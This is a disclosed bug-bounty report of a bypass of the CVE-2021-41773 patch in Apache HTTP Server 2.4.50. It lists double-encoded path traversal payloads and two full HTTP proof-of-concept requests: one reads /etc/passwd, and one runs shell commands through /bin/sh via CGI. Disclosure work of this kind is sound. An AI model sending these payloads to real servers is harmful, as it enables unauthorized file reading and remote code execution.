# Path Traversal and Remote Code Execution in Apache HTTP Server 2.4.50

## Report Details
- **Report ID**: 1404731
- **URL**: https://hackerone.com/reports/1404731
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-11-18T21:56:01.550Z
- **Disclosed**: 2021-11-19T23:45:37.511Z

## Reporter
- **Username**: itsecurityco
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Hello Apache team,

@fms and myself were able to bypass the latest patch for CVE 2021-41773 in the Apache 2.4.50.

These are the payloads:

1) %%32%65%%32%65
2) .%%32%65
3) .%%32e
4) .%2%65

PoC Path Traversal

GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: localhost:83
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="94"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

PoC RCE

POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 192.168.88.201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,es;q=0.8
If-None-Match: "2aa6-5cda88e8a6005-gzip"
If-Modified-Since: Wed, 06 Oct 2021 05:38:33 GMT
Connection: close
Content-Length: 60

echo Content-Type: text/plain; echo; id; uname;apache2ctl -M

## Impact

An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.

If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution.

## Attachments
- POC_RCE.png
- POC_Path_Traversal.png
